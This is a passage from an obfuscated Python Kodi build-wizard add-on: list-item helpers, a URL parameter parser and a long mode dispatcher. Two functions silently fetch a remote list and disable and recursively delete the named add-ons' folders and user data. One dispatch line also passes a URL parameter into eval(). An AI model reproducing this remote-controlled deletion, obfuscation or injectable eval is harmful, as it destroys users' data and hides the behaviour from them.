	if not name ==None :OOO00O00O0OOOO000 +="&name="+urllib .quote_plus (name )#line:5648
	if not url ==None :OOO00O00O0OOOO000 +="&url="+urllib .quote_plus (url )#line:5649
	OOO0OO00O0000O0O0 =True #line:5650
	if themeit :O0000OOO0OOOOO00O =themeit %O0000OOO0OOOOO00O #line:5651
	O000000OO0O00OOO0 =xbmcgui .ListItem (O0000OOO0OOOOO00O ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5652
	O000000OO0O00OOO0 .setInfo (type ="Video",infoLabels ={"Title":O0000OOO0OOOOO00O ,"Plot":description })#line:5653
	O000000OO0O00OOO0 .setProperty ("Fanart_Image",fanart )#line:5654
	if not menu ==None :O000000OO0O00OOO0 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5655
	OOO0OO00O0000O0O0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOO00O00O0OOOO000 ,listitem =O000000OO0O00OOO0 ,isFolder =True )#line:5656
	return OOO0OO00O0000O0O0 #line:5657
def addFile (O0OO0O0O0O00OOOOO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5659
	OOOO00O0OO0O0O0O0 =sys .argv [0 ]#line:5660
	if not mode ==None :OOOO00O0OO0O0O0O0 +="?mode=%s"%urllib .quote_plus (mode )#line:5661
	if not name ==None :OOOO00O0OO0O0O0O0 +="&name="+urllib .quote_plus (name )#line:5662
	if not url ==None :OOOO00O0OO0O0O0O0 +="&url="+urllib .quote_plus (url )#line:5663
	OO0OO0O0OOOO0OOOO =True #line:5664
	if themeit :O0OO0O0O0O00OOOOO =themeit %O0OO0O0O0O00OOOOO #line:5665
	OOO00OO000O00OO0O =xbmcgui .ListItem (O0OO0O0O0O00OOOOO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5666
	OOO00OO000O00OO0O .setInfo (type ="Video",infoLabels ={"Title":O0OO0O0O0O00OOOOO ,"Plot":description })#line:5667
	OOO00OO000O00OO0O .setProperty ("Fanart_Image",fanart )#line:5668
	if not menu ==None :OOO00OO000O00OO0O .addContextMenuItems (menu ,replaceItems =overwrite )#line:5669
	OO0OO0O0OOOO0OOOO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOOO00O0OO0O0O0O0 ,listitem =OOO00OO000O00OO0O ,isFolder =False )#line:5670
	return OO0OO0O0OOOO0OOOO #line:5671
def get_params ():#line:5673
	OO00OO00OOOO00000 =[]#line:5674
	OOOOOOOO000OO0000 =sys .argv [2 ]#line:5675
	if len (OOOOOOOO000OO0000 )>=2 :#line:5676
		OO0OO00OO0OO000OO =sys .argv [2 ]#line:5677
		OOO00OOOOOOOO000O =OO0OO00OO0OO000OO .replace ('?','')#line:5678
		if (OO0OO00OO0OO000OO [len (OO0OO00OO0OO000OO )-1 ]=='/'):#line:5679
			OO0OO00OO0OO000OO =OO0OO00OO0OO000OO [0 :len (OO0OO00OO0OO000OO )-2 ]#line:5680
		O00000OOOOO0O000O =OOO00OOOOOOOO000O .split ('&')#line:5681
		OO00OO00OOOO00000 ={}#line:5682
		for O00OO0000O0O0O000 in range (len (O00000OOOOO0O000O )):#line:5683
			O00OOOOO0OOOOOOOO ={}#line:5684
			O00OOOOO0OOOOOOOO =O00000OOOOO0O000O [O00OO0000O0O0O000 ].split ('=')#line:5685
			if (len (O00OOOOO0OOOOOOOO ))==2 :#line:5686
				OO00OO00OOOO00000 [O00OOOOO0OOOOOOOO [0 ]]=O00OOOOO0OOOOOOOO [1 ]#line:5687
		return OO00OO00OOOO00000 #line:5689
def remove_addons ():#line:5691
	try :#line:5692
			import json #line:5693
			OO0OOO0OOO000OOOO =urllib2 .urlopen (remove_url ).readlines ()#line:5694
			for OOOO0OOO0O0000OOO in OO0OOO0OOO000OOOO :#line:5695
				O0000OOOO0000OOOO =OOOO0OOO0O0000OOO .split (':')[1 ].strip ()#line:5697
				O0OOO0O0000000OO0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O0000OOOO0000OOOO ,'false')#line:5698
				OO0000OO00O00000O =xbmc .executeJSONRPC (O0OOO0O0000000OO0 )#line:5699
				O00OOO00OO0OO0OOO =json .loads (OO0000OO00O00000O )#line:5700
				O00O00OOOOO000OOO =os .path .join (addons_folder ,O0000OOOO0000OOOO )#line:5702
				if os .path .exists (O00O00OOOOO000OOO ):#line:5704
					for O0O0OOO000O0000O0 ,O0O0O000OOOO0O0O0 ,O0O00OO000OOO0OOO in os .walk (O00O00OOOOO000OOO ):#line:5705
						for O0O0O0OOO0OO00O00 in O0O00OO000OOO0OOO :#line:5706
							os .unlink (os .path .join (O0O0OOO000O0000O0 ,O0O0O0OOO0OO00O00 ))#line:5707
						for O00O0O00O00O0O00O in O0O0O000OOOO0O0O0 :#line:5708
							shutil .rmtree (os .path .join (O0O0OOO000O0000O0 ,O00O0O00O00O0O00O ))#line:5709
					os .rmdir (O00O00OOOOO000OOO )#line:5710
			xbmc .executebuiltin ('Container.Refresh')#line:5712
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5713
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5714
	except :pass #line:5715
def remove_addons2 ():#line:5716
	try :#line:5717
			import json #line:5718
			O000O000O0OOOOO00 =urllib2 .urlopen (remove_url2 ).readlines ()#line:5719
			for OO00O0OO0OOO00OO0 in O000O000O0OOOOO00 :#line:5720
				O00O00OO0OOO0O0OO =OO00O0OO0OOO00OO0 .split (':')[1 ].strip ()#line:5722
				OO00O0O00000OOOOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O00O00OO0OOO0O0OO ,'false')#line:5723
				OO00000OOO0O0OOO0 =xbmc .executeJSONRPC (OO00O0O00000OOOOO )#line:5724
				OOOOOO00O0OOOO00O =json .loads (OO00000OOO0O0OOO0 )#line:5725
				OO0OO00OO00OOOO0O =os .path .join (user_folder ,O00O00OO0OOO0O0OO )#line:5727
				if os .path .exists (OO0OO00OO00OOOO0O ):#line:5729
					for O0O000OOOOOOO000O ,O000000OO0O0OO000 ,OOOOO0OO0OO0OO00O in os .walk (OO0OO00OO00OOOO0O ):#line:5730
						for O00O0OO0O0OO00O0O in OOOOO0OO0OO0OO00O :#line:5731
							os .unlink (os .path .join (O0O000OOOOOOO000O ,O00O0OO0O0OO00O0O ))#line:5732
						for OO0OO0000O0O00OO0 in O000000OO0O0OO000 :#line:5733
							shutil .rmtree (os .path .join (O0O000OOOOOOO000O ,OO0OO0000O0O00OO0 ))#line:5734
					os .rmdir (OO0OO00OO00OOOO0O )#line:5735
	except :pass #line:5737
params =get_params ()#line:5738
url =None #line:5739
name =None #line:5740
mode =None #line:5741
try :mode =urllib .unquote_plus (params ["mode"])#line:5743
except :pass #line:5744
try :name =urllib .unquote_plus (params ["name"])#line:5745
except :pass #line:5746
try :url =urllib .unquote_plus (params ["url"])#line:5747
except :pass #line:5748
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5750
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5751
def setView (O00O0OOOOOOOOO0O0 ,OO0OOO00OOO0O000O ):#line:5752
	if wiz .getS ('auto-view')=='true':#line:5753
		O0OO0OO0OOOO00000 =wiz .getS (OO0OOO00OOO0O000O )#line:5754
		if O0OO0OO0OOOO00000 =='50'and KODIV >=17 and SKIN =='skin.estuary':O0OO0OO0OOOO00000 ='55'#line:5755
		if O0OO0OO0OOOO00000 =='500'and KODIV >=17 and SKIN =='skin.estuary':O0OO0OO0OOOO00000 ='50'#line:5756
		wiz .ebi ("Container.SetViewMode(%s)"%O0OO0OO0OOOO00000 )#line:5757
if mode ==None :index ()#line:5759
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5761
elif mode =='builds':buildMenu ()#line:5762
elif mode =='viewbuild':viewBuild (name )#line:5763
elif mode =='buildinfo':buildInfo (name )#line:5764
elif mode =='buildpreview':buildVideo (name )#line:5765
elif mode =='install':buildWizard (name ,url )#line:5766
elif mode =='theme':buildWizard (name ,mode ,url )#line:5767
elif mode =='viewthirdparty':viewThirdList (name )#line:5768
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5769
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5770
elif mode =='maint':maintMenu (name )#line:5772
elif mode =='passpin':passandpin ()#line:5773
elif mode =='backmyupbuild':backmyupbuild ()#line:5774
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5775
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5776
elif mode =='advancedsetting':advancedWindow (name )#line:5777
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5778
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5779
elif mode =='asciicheck':wiz .asciiCheck ()#line:5780
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5781
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5782
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5783
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5784
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5785
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5786
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5787
elif mode =='currentsettings':viewAdvanced ()#line:5788
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5789
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5790
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5791
elif mode =='fixskin':backtokodi ()#line:5792
elif mode =='testcommand':testcommand ()#line:5793
elif mode =='logsend':logsend ()#line:5794
elif mode =='rdon':rdon ()#line:5795
elif mode =='rdoff':rdoff ()#line:5796
elif mode =='setrd':setrealdebrid ()#line:5797
elif mode =='setrd2':setautorealdebrid ()#line:5798
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5799
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5800
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5801
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5802
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5803
elif mode =='freshstart':freshStart ()#line:5804
elif mode =='forceupdate':wiz .forceUpdate ()#line:5805
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5806
elif mode =='forceclose':wiz .killxbmc ()#line:5807
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5808
elif mode =='hidepassword':wiz .hidePassword ()#line:5809
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5810
elif mode =='enableaddons':enableAddons ()#line:5811
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5812
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5813
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5814
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5815
elif mode =='uploadlog':uploadLog .Main ()#line:5816
elif mode =='viewlog':LogViewer ()#line:5817
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5818
elif mode =='viewerrorlog':errorChecking (all =True )#line:5819
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5820
elif mode =='purgedb':purgeDb ()#line:5821
elif mode =='fixaddonupdate':fixUpdate ()#line:5822
elif mode =='removeaddons':removeAddonMenu ()#line:5823
elif mode =='removeaddon':removeAddon (name )#line:5824
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5825
elif mode =='removedata':removeAddonData (name )#line:5826
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5827
elif mode =='systeminfo':systemInfo ()#line:5828
elif mode =='restorezip':restoreit ('build')#line:5829
elif mode =='restoregui':restoreit ('gui')#line:5830
elif mode =='restoreaddon':restoreit ('addondata')#line:5831
elif mode =='restoreextzip':restoreextit ('build')#line:5832
elif mode =='restoreextgui':restoreextit ('gui')#line:5833
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5834
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5835
elif mode =='traktsync':traktsync ()#line:5836
elif mode =='apk':apkMenu (name )#line:5838
elif mode =='apkscrape':apkScraper (name )#line:5839
elif mode =='apkinstall':apkInstaller (name ,url )#line:5840
elif mode =='speed':speedMenu ()#line:5841
elif mode =='net':net_tools ()#line:5842
elif mode =='GetList':GetList (url )#line:5843
elif mode =='youtube':youtubeMenu (name )#line:5844
elif mode =='viewVideo':playVideo (url )#line:5845
elif mode =='addons':addonMenu (name )#line:5847
elif mode =='addoninstall':addonInstaller (name ,url )#line:5848
elif mode =='savedata':saveMenu ()#line:5850
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5851
elif mode =='managedata':manageSaveData (name )#line:5852
elif mode =='whitelist':wiz .whiteList (name )#line:5853
elif mode =='trakt':traktMenu ()#line:5855
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5856
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5857
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5858
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5859
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5860
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5861
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5862
elif mode =='realdebrid':realMenu ()#line:5864
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5865
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5866
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5867
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5868
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5869
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5870
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5871
elif mode =='login':loginMenu ()#line:5873
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5874
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5875
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5876
elif mode =='clearlogin':loginit .clearSaved (name )#line:5877
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5878
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5879
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5880
elif mode =='contact':notify .contact (CONTACT )#line:5882
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5883
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5884
elif mode =='developer':developer ()#line:5886
elif mode =='converttext':wiz .convertText ()#line:5887
elif mode =='createqr':wiz .createQR ()#line:5888
elif mode =='testnotify':testnotify ()#line:5889
elif mode =='testnotify2':testnotify2 ()#line:5890
elif mode =='servicemanual':servicemanual ()#line:5891
elif mode =='fastinstall':fastinstall ()#line:5892
elif mode =='testupdate':testupdate ()#line:5893
elif mode =='testfirst':testfirst ()#line:5894
elif mode =='testfirstrun':testfirstRun ()#line:5895
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5896
elif mode =='bg':wiz .bg_install (name ,url )#line:5898
elif mode =='bgcustom':wiz .bg_custom ()#line:5899
elif mode =='bgremove':wiz .bg_remove ()#line:5900
elif mode =='bgdefault':wiz .bg_default ()#line:5901
elif mode =='rdset':rdsetup ()#line:5902
elif mode =='mor':morsetup ()#line:5903
elif mode =='mor2':morsetup2 ()#line:5904
elif mode =='resolveurl':resolveurlsetup ()#line:5905
elif mode =='urlresolver':urlresolversetup ()#line:5906
elif mode =='forcefastupdate':forcefastupdate ()#line:5907
elif mode =='traktset':traktsetup ()#line:5908
elif mode =='placentaset':placentasetup ()#line:5909
elif mode =='flixnetset':flixnetsetup ()#line:5910
elif mode =='reptiliaset':reptiliasetup ()#line:5911
elif mode =='yodasset':yodasetup ()#line:5912
elif mode =='numbersset':numberssetup ()#line:5913
elif mode =='uranusset':uranussetup ()#line:5914
elif mode =='genesisset':genesissetup ()#line:5915
elif mode =='fastupdate':fastupdate ()#line:5916
elif mode =='folderback':folderback ()#line:5917
elif mode =='menudata':Menu ()#line:5918
elif mode =='infoupdate':infobuild ()#line:5919
elif mode =='wait':wait ()#line:5920
elif mode ==2 :#line:5921
        wiz .torent_menu ()#line:5922
elif mode ==3 :#line:5923
        wiz .popcorn_menu ()#line:5924
elif mode ==8 :#line:5925
        wiz .metaliq_fix ()#line:5926
elif mode ==9 :#line:5927
        wiz .quasar_menu ()#line:5928
elif mode ==5 :#line:5929
        swapSkins ('skin.Premium.mod')#line:5930
elif mode ==13 :#line:5931
        wiz .elementum_menu ()#line:5932
elif mode ==16 :#line:5933
        wiz .fix_wizard ()#line:5934
elif mode ==17 :#line:5935
        wiz .last_play ()#line:5936
elif mode ==18 :#line:5937
        wiz .normal_metalliq ()#line:5938
elif mode ==19 :#line:5939
        wiz .fast_metalliq ()#line:5940
elif mode ==20 :#line:5941
        wiz .fix_buffer2 ()#line:5942
elif mode ==21 :#line:5943
        wiz .fix_buffer3 ()#line:5944
elif mode ==11 :#line:5945
        wiz .fix_buffer ()#line:5946
elif mode ==15 :#line:5947
        wiz .fix_font ()#line:5948
elif mode ==14 :#line:5949
        wiz .clean_pass ()#line:5950
elif mode ==22 :#line:5951
        wiz .movie_update ()#line:5952
elif mode =='update_tele':updatetelemedia (NOTEID )#line:5954
elif mode =='adv_settings':buffer1 ()#line:5955
elif mode =='getpass':getpass ()#line:5956
elif mode =='setpass':setpass ()#line:5957
elif mode =='setuname':setuname ()#line:5958
elif mode =='passandUsername':passandUsername ()#line:5959
elif mode =='9':disply_hwr ()#line:5960
elif mode =='99':disply_hwr2 ()#line:5961
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))